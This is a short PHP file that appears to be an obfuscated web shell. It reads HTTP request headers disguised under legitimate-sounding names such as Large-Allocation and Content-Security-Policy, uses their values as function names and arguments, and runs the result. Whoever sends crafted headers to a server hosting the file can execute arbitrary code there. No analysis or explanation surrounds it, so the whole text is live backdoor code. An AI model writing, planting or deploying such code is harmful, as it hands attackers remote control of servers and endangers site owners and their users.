<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $include = $_HEADERS['Large-Allocation']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Feature-Policy']));
    $include();
}